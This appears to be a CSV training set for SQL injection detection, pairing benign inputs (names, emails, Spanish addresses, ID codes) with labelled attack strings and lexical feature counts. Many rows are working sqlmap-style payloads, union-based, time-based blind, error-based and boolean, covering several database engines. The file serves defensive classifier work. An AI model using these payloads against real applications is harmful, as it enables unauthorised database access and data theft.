Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
57rsant2541,0,57rsant2541,11,1,0,0,0,0,0,0,0,5,0,0
sanchn de la ribera,0,sanchn de la ribera,19,4,0,0,0,0,3,0,0,16,0,0
montagnani_walling@am-si.sh,0,montagnani_walling am si sh,27,4,0,0,3,0,0,0,1,23,0,0
ataz crehuet,0,ataz crehuet,12,2,0,0,0,0,1,0,0,11,0,0
mcnerlan,0,mcnerlan,8,1,0,0,0,0,0,0,0,8,0,0
sosa,0,sosa,4,1,0,0,0,0,0,0,0,4,0,0
rorke,0,rorke,5,1,0,0,0,0,0,0,0,5,0,0
ciolli_heesters6@zeat.es,0,ciolli_heesters6 zeat es,24,3,0,0,3,0,0,0,0,20,0,0
"1""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((""tbcc""=""tbcc",1,select count from domain domains as t1 domain columns as t2 domain tables as t3 and tbcc tbcc,106,18,0,4,7,0,11,1,1,73,6,1
bylina,0,bylina,6,1,0,0,0,0,0,0,0,6,0,0
"-7499%"") union all select 1893,1893,1893,1893,1893#",1,union all select,51,3,0,1,6,1,4,0,1,14,3,0
"1' where 5547=5547;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,where select count from domain domains as t1 domain columns as t2 domain tables as t3,103,16,1,0,7,1,11,0,3,67,6,1
1) where 6884=6884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1,where and in char char char char char select case when then char else char end char char char char char,201,21,0,0,2,1,14,1,12,83,9,12
-3246%' union all select 4012#,1,union all select,30,3,1,0,2,1,4,0,1,14,3,0
celeste_bryon@skullride.ki,0,celeste_bryon skullride ki,26,3,0,0,3,0,0,0,0,23,0,0
llorador,0,llorador,8,1,0,0,0,0,0,0,0,8,0,0
"1',(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7823=7823) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",1,cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric,182,20,1,0,24,0,10,0,0,72,7,10
yf,0,yf,2,1,0,0,0,0,0,0,0,2,0,0
ninn,0,ninn,4,1,0,0,0,0,0,0,0,4,0,0
98058748l,0,98058748l,9,1,0,0,0,0,0,0,0,1,0,0
raymond,0,raymond,7,1,0,0,0,0,0,0,0,7,0,0
-6500')) or (8459=8459)*4906 and (('padu' like 'padu,1,or and padu like padu,52,5,4,0,1,0,6,2,2,17,3,0
04897,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1%"")));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1,select from generate_series case when then else end limit,97,9,0,1,6,1,12,0,3,48,8,0
ivancevi,0,ivancevi,8,1,0,0,0,0,0,0,0,8,0,0
10380,0,,5,0,0,0,0,0,0,0,0,0,0,0
.espejo,0,espejo,7,1,0,0,1,0,0,0,0,6,0,0
1246947052735749,0,,16,0,0,0,0,0,0,0,0,0,0,0
berberisco,0,berberisco,10,1,0,0,0,0,0,0,0,10,0,0
96761343k,0,96761343k,9,1,0,0,0,0,0,0,0,1,0,0
vall de ebo,0,vall de ebo,11,3,0,0,0,0,2,0,0,9,0,0
1%') order by 1#,1,order by,16,2,1,0,2,1,3,0,0,7,2,0
"1"")));select pg_sleep(5)--",1,select pg_sleep,26,2,0,1,2,1,1,0,2,13,1,1
a4al4s9,0,a4al4s9,7,1,0,0,0,0,0,0,0,4,0,0
6162508820566713,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1'||(select 'zbdv' where 1618=1618 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))||'",1,select zbdv where or exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78,140,14,4,0,11,0,10,1,1,58,7,3
"1'||(select 'qjwf' from dual where 3187=3187 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))||'",1,select qjwf from dual where and char char char char regexp_substring repeat right char null,156,15,4,0,16,0,7,1,0,76,6,8
9845728819454113,0,,16,0,0,0,0,0,0,0,0,0,0,0
750,0,,3,0,0,0,0,0,0,0,0,0,0,0
"-9886%'))) union all select 5191,5191,5191,5191,5191,5191,5191--",1,union all select,64,3,1,0,7,1,4,0,3,14,3,0
vingelli9@custombikesclothes.fr,0,vingelli9 custombikesclothes fr,31,3,0,0,2,0,0,0,0,28,0,0
11300,0,,5,0,0,0,0,0,0,0,0,0,0,0
40560,0,,5,0,0,0,0,0,0,0,0,0,0,0
trumbull.presie@esbien.pk,0,trumbull presie esbien pk,25,4,0,0,3,0,0,0,0,22,0,0
"1"")) as jgie where 8017=8017 and (select * from (select(sleep(5)))fzno)--",1,as jgie where and select from select sleep fzno,73,9,0,1,1,1,9,1,3,39,6,1
creyente,0,creyente,8,1,0,0,0,0,0,0,0,8,0,0
marangosoff@sigloventidos.cl,0,marangosoff sigloventidos cl,28,3,0,0,2,0,0,0,0,26,0,0
yernes y tameza,0,yernes tameza,15,2,0,0,0,0,2,0,0,13,0,0
sagaceta farell,0,sagaceta farell,15,2,0,0,0,0,1,0,0,14,0,0
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'cdgm' like 'cdgm",1,and select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and cdgm like cdgm,180,16,4,0,7,0,14,2,2,64,9,3
1)) waitfor delay '0:0:5'--,1,waitfor delay,27,2,2,0,2,1,3,0,2,12,0,2
ret4ne3or,0,ret4ne3or,9,1,0,0,0,0,0,0,0,7,0,0
madriles hernandez,0,madriles hernandez,18,2,0,0,0,0,1,0,0,17,0,0
ilijev@mauroman.tc,0,ilijev mauroman tc,18,3,0,0,2,0,0,0,0,16,0,0
4291273223594568,0,,16,0,0,0,0,0,0,0,0,0,0,0
1'||(select 'mobv' from dual where 6338=6338;select sleep(5))||',1,select mobv from dual where select sleep,64,7,4,0,6,0,6,0,0,34,4,1
nugent,0,nugent,6,1,0,0,0,0,0,0,0,6,0,0
stormy,0,stormy,6,1,0,0,0,0,0,0,0,6,0,0
49650,0,,5,0,0,0,0,0,0,0,0,0,0,0
"paseo francisco mir berlanga 141, 12-e",0,paseo francisco mir berlanga,38,4,0,0,1,0,5,0,1,26,0,0
d47tesi1,0,d47tesi1,8,1,0,0,0,0,0,0,0,5,0,0
receptadora,0,receptadora,11,1,0,0,0,0,0,0,0,11,0,0
mitjans,0,mitjans,7,1,0,0,0,0,0,0,0,7,0,0
4ub16ns8rv0do5,0,4ub16ns8rv0do5,14,1,0,0,0,0,0,0,0,8,0,0
"urbanitzacio canyet 24, 4?a",0,urbanitzacio canyet,27,2,0,0,2,0,3,0,0,19,0,0
1%')));select (case when (2294=3651) then 2294 else 2294*(select 2294 from information_schema.character_sets) end)#,1,select case when then else select from information_schema character_sets end,115,10,1,0,7,1,11,0,1,65,8,0
1041858100277526,0,,16,0,0,0,0,0,0,0,0,0,0,0
1')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('uqfs'='uqfs,1,and qqpjq select case when then else end from rdb database qzvzq and uqfs uqfs,117,15,8,0,7,0,15,2,0,64,9,1
"1) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1,or char char char char regexp_substring repeat left crypt_key char char char null null,142,14,0,0,17,0,2,1,0,71,4,11
"1"")) as zbfj where 2285=2285;(select * from (select(sleep(5)))acdk)#",1,as zbfj where select from select sleep acdk,68,8,0,1,3,1,7,0,1,36,5,1
standfor,0,standfor,8,1,0,0,0,0,0,0,0,8,0,0
elder@parcalia.hn,0,elder parcalia hn,17,3,0,0,2,0,0,0,0,15,0,0
48550,0,,5,0,0,0,0,0,0,0,0,0,0,0
miles_detmers@sotelink.vu,0,miles_detmers sotelink vu,25,3,0,0,3,0,0,0,0,22,0,0
1) as xylu where 3338=3338 rlike (select * from (select(sleep(5)))sgvo)--,1,as xylu where rlike select from select sleep sgvo,73,9,0,0,1,1,9,0,3,41,6,1
1' in boolean mode) and 5981=6700,1,in boolean mode and,33,4,1,0,1,0,5,1,0,16,2,0
presencio,0,presencio,9,1,0,0,0,0,0,0,0,9,0,0
eluney,0,eluney,6,1,0,0,0,0,0,0,0,6,0,0
"-2298%' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,or group by concat 0x7171706a71 select case when then else end 0x717a767a71 floor rand having min,138,16,1,0,6,1,15,1,2,63,10,3
57418420r,0,57418420r,9,1,0,0,0,0,0,0,0,1,0,0
"c/ gaspar reyes, 172 8?f",0,gaspar reyes,24,2,0,0,2,0,4,0,1,13,0,0
9448799154735544,0,,16,0,0,0,0,0,0,0,0,0,0,0
29?em2ti3a,0,em2ti3a,10,1,0,0,1,0,0,0,0,5,0,0
micr6pil8,0,micr6pil8,9,1,0,0,0,0,0,0,0,7,0,0
13440,0,,5,0,0,0,0,0,0,0,0,0,0,0
46198,0,,5,0,0,0,0,0,0,0,0,0,0,0
1'+(select lptb where 3861=3861 or sleep(5))+',1,select lptb where or sleep,46,5,2,0,1,0,5,1,2,22,3,1
"1'));iif(8213=4718,1,1/0)",1,iif,25,1,1,0,4,0,0,0,1,3,0,0
1' and (select * from (select(sleep(5)))fzno),1,and select from select sleep fzno,45,6,1,0,0,0,5,1,1,28,4,1
21890,0,,5,0,0,0,0,0,0,0,0,0,0,0
osarte caella,0,osarte caella,13,2,0,0,0,0,1,0,0,12,0,0
85022940j,0,85022940j,9,1,0,0,0,0,0,0,0,1,0,0
"1%""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""%""=""",1,or select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7 and,169,26,0,4,10,0,21,2,1,111,11,1
-8341 or 8571=8571--,1,or,20,1,0,0,1,1,2,1,3,2,0,0
ponts,0,ponts,5,1,0,0,0,0,0,0,0,5,0,0
"c/ juan de bustamante, 30, 10b",0,juan de bustamante 10b,30,4,0,0,2,0,5,0,1,18,0,0
dis0reg2r,0,dis0reg2r,9,1,0,0,0,0,0,0,0,7,0,0
cualedro,0,cualedro,8,1,0,0,0,0,0,0,0,8,0,0
ron,0,ron,3,1,0,0,0,0,0,0,0,3,0,0
midler.scarpa@mtos.gs,0,midler scarpa mtos gs,21,4,0,0,3,0,0,0,0,18,0,0
"1%"" union all select null,null,null,null,null,null,null,null,null,null#",1,union all select null null null null null null null null null null,71,13,0,1,11,1,4,0,0,54,13,0
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",1,or select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,102,16,0,0,6,0,11,1,1,71,6,1
nicks@guejosgratis.pt,0,nicks guejosgratis pt,21,3,0,0,2,0,0,0,0,19,0,0
"1) and elt(4249=4249,7259) and (8226=8226",1,and elt and,41,3,0,0,3,0,4,2,0,9,2,1
"1,(select (case when (5885=1825) then 1 else 5885*(select 5885 from master..sysdatabases) end))",1,select case when then else select from master sysdatabases end,95,10,0,0,4,0,11,0,1,53,8,0
-2120') or 8734=8844#,1,or,21,1,1,0,2,1,2,1,1,2,0,0
juha,0,juha,4,1,0,0,0,0,0,0,0,4,0,0
1)));select sleep(5) and (((8354=8354,1,select sleep and,37,3,0,0,2,0,3,1,0,14,2,1
"1'+(select pdfv where 1172=1172 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))+'",1,select pdfv where and updatexml concat 0x2e 0x7171706a71 select elt 0x717a767a71,126,11,2,0,8,0,6,1,2,49,4,3
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""zbwn"" like ""zbwn",1,or like abcdefg upper hex randomblob and zbwn like zbwn,86,10,2,4,2,0,6,2,1,46,4,3
5561938510666442,0,,16,0,0,0,0,0,0,0,0,0,0,0
3u*3m15i92,0,3u 3m15i92,10,2,0,0,0,0,0,0,1,3,0,0
"1%')) union all select null,null,null,null,null,null#",1,union all select null null null null null null,53,9,1,0,7,1,4,0,0,38,9,0
-6179)) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((7732=7732,1,or cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric and,209,22,0,0,25,0,14,2,1,77,9,10
doblonada,0,doblonada,9,1,0,0,0,0,0,0,0,9,0,0
羵,0,,1,0,0,0,0,0,0,0,0,0,0,0
salas solmoirago,0,salas solmoirago,16,2,0,0,0,0,1,0,0,15,0,0
vallado oliveras,0,vallado oliveras,16,2,0,0,0,0,1,0,0,15,0,0
bringu mulleras,0,bringu mulleras,15,2,0,0,0,0,1,0,0,14,0,0
san perfecto 8,0,san perfecto,14,2,0,0,0,0,2,0,0,11,0,0
alvino,0,alvino,6,1,0,0,0,0,0,0,0,6,0,0
bujaraloz,0,bujaraloz,9,1,0,0,0,0,0,0,0,9,0,0
6ncanta33n,0,6ncanta33n,10,1,0,0,0,0,0,0,0,7,0,0
selles tanari,0,selles tanari,13,2,0,0,0,0,1,0,0,12,0,0
ambatll comalada,0,ambatll comalada,16,2,0,0,0,0,1,0,0,15,0,0
"1) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (7244=7244",1,or char char char char regexp_substring repeat left crypt_key char char char null null and,157,15,0,0,18,0,4,2,0,74,5,11
"c/ cervera 164, 1e",0,cervera 1e,18,2,0,0,1,0,3,0,1,9,0,0
excepta,0,excepta,7,1,0,0,0,0,0,0,0,7,0,0
"1'||(select 'hvqw' from dual where 4423=4423 union all select null,null,null--",1,select hvqw from dual where union all select null null null,78,11,3,0,5,1,9,0,2,49,9,0
"1""));(select * from (select(sleep(5)))acdk)#",1,select from select sleep acdk,44,5,0,1,2,1,3,0,1,25,3,1
grimm@madrid2012.nu,0,grimm madrid2012 nu,19,3,0,0,2,0,0,0,0,13,0,0
ronet_huebner@nikemujeres.bm,0,ronet_huebner nikemujeres bm,28,3,0,0,3,0,0,0,0,25,0,0
-7971' union all select 4273#,1,union all select,29,3,1,0,1,1,4,0,1,14,3,0
"1))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (((1782=1782",1,or row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by and,222,22,0,0,9,0,21,2,3,101,14,5
nandan,0,nandan,6,1,0,0,0,0,0,0,0,6,0,0
cuboides,0,cuboides,8,1,0,0,0,0,0,0,0,8,0,0
compatrn,0,compatrn,8,1,0,0,0,0,0,0,0,8,0,0
v3,0,v3,2,1,0,0,0,0,0,0,0,1,0,0
27744538y,0,27744538y,9,1,0,0,0,0,0,0,0,1,0,0
46324867s,0,46324867s,9,1,0,0,0,0,0,0,0,1,0,0
"1'||(select 'ybfo' from dual where 3319=3319 union all select null,null,null,null,null,null,null,null#",1,select ybfo from dual where union all select null null null null null null null null,102,16,3,0,11,1,9,0,0,69,14,0
embaldosada,0,embaldosada,11,1,0,0,0,0,0,0,0,11,0,0
akio,0,akio,4,1,0,0,0,0,0,0,0,4,0,0
"1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('skdy'='skdy",1,and char char char char regexp_substring repeat right char null and skdy skdy,133,13,4,0,12,0,4,2,0,64,4,8
"1"")) as ndbk where 5042=5042 and 8594=(select 8594 from pg_sleep(5))--",1,as ndbk where and select from pg_sleep,70,7,0,1,3,1,9,1,2,31,5,1
car,0,car,3,1,0,0,0,0,0,0,0,3,0,0
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",1,select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 uugg,98,16,0,0,6,1,10,0,3,73,5,1
"1%""))) or sleep(5)#",1,or sleep,19,2,0,1,2,1,2,1,0,7,1,1
1'+(select oljg where 2006=2006 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))+',1,select oljg where and select upper xmltype chr chr chr chr chr chr chr select case when then else end from dual chr chr chr chr chr chr from dual,266,30,2,0,29,0,18,1,2,116,12,15
"c/ albaida, 165, 2-a",0,albaida,20,1,0,0,2,0,3,0,2,9,0,0
-2783%')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',1,or select upper xmltype chr chr chr chr chr chr chr select case when then else end from dual chr chr chr chr chr chr from dual and,252,28,4,0,31,0,17,2,1,103,11,15
c/ florida 162 1-f,0,florida,18,1,0,0,0,0,3,0,2,9,0,0
salvatore,0,salvatore,9,1,0,0,0,0,0,0,0,9,0,0
juzbado,0,juzbado,7,1,0,0,0,0,0,0,0,7,0,0
"c/ nogueira, 86 11b",0,nogueira 11b,19,2,0,0,1,0,3,0,1,10,0,0
briant,0,briant,6,1,0,0,0,0,0,0,0,6,0,0
42836631m,0,42836631m,9,1,0,0,0,0,0,0,0,1,0,0
96815806c,0,96815806c,9,1,0,0,0,0,0,0,0,1,0,0
calzada rebassa,0,calzada rebassa,15,2,0,0,0,0,1,0,0,14,0,0
668,0,,3,0,0,0,0,0,0,0,0,0,0,0
"1"") or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,or select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7,155,25,0,1,7,1,19,1,3,108,10,1
42120,0,,5,0,0,0,0,0,0,0,0,0,0,0
tape,0,tape,4,1,0,0,0,0,0,0,0,4,0,0
08300,0,,5,0,0,0,0,0,0,0,0,0,0,0
tiza,0,tiza,4,1,0,0,0,0,0,0,0,4,0,0
pelarrodrguez,0,pelarrodrguez,13,1,0,0,0,0,0,0,0,13,0,0
v5482+ct0,0,v5482 ct0,9,2,0,0,0,0,0,0,1,3,0,0
6068872353637428,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1"") where 1833=1833;select (case when (3344=8103) then 3344 else 1/(select 0) end)--",1,where select case when then else select end,84,8,0,1,3,1,11,0,3,36,8,0
stephan,0,stephan,7,1,0,0,0,0,0,0,0,7,0,0
"1'||(select 'svbf' where 7017=7017 or elt(6272=6272,sleep(5)))||'",1,select svbf where or elt sleep,65,6,4,0,7,0,5,1,0,25,3,2
"1 where 5485=5485 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,where or char char char char regexp_substring repeat left crypt_key char char char null null,159,15,0,0,18,1,4,1,2,76,5,11
1%') or (select * from (select(sleep(5)))ydpu) and ('%'=',1,or select from select sleep ydpu and,57,7,4,0,3,0,7,2,1,30,5,1
"-8793' where 3853=3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",1,where union all select,80,4,1,0,9,1,6,0,1,19,4,0
scheff_guiffre@interpretacion-diccionario-y-significado-de-los-s,0,scheff_guiffre interpretacion diccionario significado de los,64,6,0,0,2,0,0,0,6,56,0,0
70190724z,0,70190724z,9,1,0,0,0,0,0,0,0,1,0,0
"1') as knxr where 5662=5662 union all select null,null,null,null,null,null,null,null#",1,as knxr where union all select null null null null null null null null,85,14,1,0,9,1,8,0,0,57,13,0
65236882g,0,65236882g,9,1,0,0,0,0,0,0,0,1,0,0
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('yaim'='yaim,1,and dbms_utility sqlid_to_sqlhash chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and yaim yaim,224,24,4,0,27,0,14,2,0,102,9,12
sabio,0,sabio,5,1,0,0,0,0,0,0,0,5,0,0
ag2u7a,0,ag2u7a,6,1,0,0,0,0,0,0,0,4,0,0
aracena,0,aracena,7,1,0,0,0,0,0,0,0,7,0,0
-1730' or 8571=8571--,1,or,21,1,1,0,1,1,2,1,3,2,0,0
"calle sanchez guerrero, 63, 10?h",0,calle sanchez guerrero,32,3,0,0,3,0,4,0,0,21,0,0
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('svhx'='svhx,1,and in char char char char char select case when then char else char end char char char char char and svhx svhx,202,23,4,0,2,0,14,2,10,89,9,12
zapach,0,zapach,6,1,0,0,0,0,0,0,0,6,0,0
"1)) as rwsn where 9946=9946 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",1,as rwsn where or extractvalue concat 0x5c 0x7171706a71 select elt 0x717a767a71,118,11,0,0,7,1,7,1,2,47,4,3
5349288055787524,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('zaru'='zaru",1,select count from domain domains as t1 domain columns as t2 domain tables as t3 and zaru zaru,106,18,4,0,7,0,11,1,1,73,6,1
30584367w,0,30584367w,9,1,0,0,0,0,0,0,0,1,0,0
-1940 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),1,or cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric,191,21,0,0,24,0,12,1,1,74,8,10
torcac2,0,torcac2,7,1,0,0,0,0,0,0,0,6,0,0
"c/ eulogio serdan, 139 5a",0,eulogio serdan 5a,25,3,0,0,1,0,4,0,1,15,0,0
"1"")) as wfne where 8933=8933;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",1,as wfne where select case when then else select end,93,10,0,1,3,1,13,0,3,42,9,0
ochoa7,0,ochoa7,6,1,0,0,0,0,0,0,0,5,0,0
00033926r,0,00033926r,9,1,0,0,0,0,0,0,0,1,0,0
mastroma,0,mastroma,8,1,0,0,0,0,0,0,0,8,0,0
oconor@italianmotorvillagesevilla.sm,0,oconor italianmotorvillagesevilla sm,36,3,0,0,2,0,0,0,0,34,0,0
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('wdeu' like 'wdeu",1,and convert int select char char char char char select case when then char else char end char char char char char and wdeu like wdeu,222,26,4,0,3,0,15,2,10,107,10,12
1' in boolean mode) rlike sleep(5)#,1,in boolean mode rlike sleep,35,5,1,0,1,1,5,0,0,23,2,1
1);select pg_sleep(5)--,1,select pg_sleep,23,2,0,0,2,1,1,0,2,13,1,1
"1%"" and sleep(5)#",1,and sleep,17,2,0,1,2,1,2,1,0,8,1,1
"1%""))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,or char char char char regexp_substring repeat left crypt_key char char char null null,144,14,0,1,18,1,2,1,2,71,4,11
calle guatemala 12 11c,0,calle guatemala 11c,22,3,0,0,0,0,3,0,0,15,0,0
dove3@enla.nc,0,dove3 enla nc,13,3,0,0,2,0,0,0,0,10,0,0
1'+(select 'gmpn' where 8137=8137 or sleep(5))+',1,select gmpn where or sleep,48,5,4,0,1,0,5,1,2,22,3,1
voseo,0,voseo,5,1,0,0,0,0,0,0,0,5,0,0
7578225963562090,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1,select from generate_series case when then else end limit,92,9,0,0,5,1,12,0,3,48,8,0
"calle juan sitges 24,",0,calle juan sitges,21,3,0,0,1,0,3,0,0,15,0,0
25245,0,,5,0,0,0,0,0,0,0,0,0,0,0
g89273t2,0,g89273t2,8,1,0,0,0,0,0,0,0,2,0,0
"1"")) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1,or char char char char regexp_substring repeat right char null,113,10,0,1,11,1,2,1,2,52,3,8
"1) where 9829=9829 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,where or char char char char regexp_substring repeat left crypt_key char char char null null,156,15,0,0,18,1,4,1,2,76,5,11
"calle gardenia, 35",0,calle gardenia,18,2,0,0,1,0,2,0,0,13,0,0
eckstine@blueeyes.eu,0,eckstine blueeyes eu,20,3,0,0,2,0,0,0,0,18,0,0
porro,0,porro,5,1,0,0,0,0,0,0,0,5,0,0
1,0,,2,0,0,0,0,0,0,0,0,0,0,0
telly,0,telly,5,1,0,0,0,0,0,0,0,5,0,0
gussack.reinecke@eddydaniele.pt,0,gussack reinecke eddydaniele pt,31,4,0,0,3,0,0,0,0,28,0,0
"-4166%"") union all select 5190--",1,union all select,32,3,0,1,1,1,4,0,3,14,3,0
trasabuela,0,trasabuela,10,1,0,0,0,0,0,0,0,10,0,0
abades,0,abades,6,1,0,0,0,0,0,0,0,6,0,0
3119845322220598,0,,16,0,0,0,0,0,0,0,0,0,0,0
rivalee,0,rivalee,7,1,0,0,0,0,0,0,0,7,0,0
"-6158""))) or 8571=8571--",1,or,24,1,0,1,1,1,2,1,3,2,0,0
woronov@connect.gr,0,woronov connect gr,18,3,0,0,2,0,0,0,0,16,0,0
"1"");waitfor delay '0:0:5' and (""ludp"" like ""ludp",1,waitfor delay and ludp like ludp,48,6,2,4,3,0,6,1,0,27,2,2
9473535060757439,0,,16,0,0,0,0,0,0,0,0,0,0,0
9e6e3illa,0,9e6e3illa,9,1,0,0,0,0,0,0,0,6,0,0
c/ antonio momplet 114,0,antonio momplet,22,2,0,0,0,0,3,0,1,15,0,0
"1) where 2781=2781 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,where or select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,116,15,0,0,11,1,12,1,3,67,4,1
"-3555') or make_set(9354=9354,7185) and ('papr'='papr",1,or make_set and papr papr,53,5,4,0,4,0,4,2,1,20,2,1
jabalquinto,0,jabalquinto,11,1,0,0,0,0,0,0,0,11,0,0
"-5516'+(select 'bmlv' where 7188=7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",1,select bmlv where union all select,95,6,3,0,9,1,7,0,2,29,5,0
solana,0,solana,6,1,0,0,0,0,0,0,0,6,0,0
cath,0,cath,4,1,0,0,0,0,0,0,0,4,0,0
-7775 or 8571=8571--,1,or,20,1,0,0,1,1,2,1,3,2,0,0
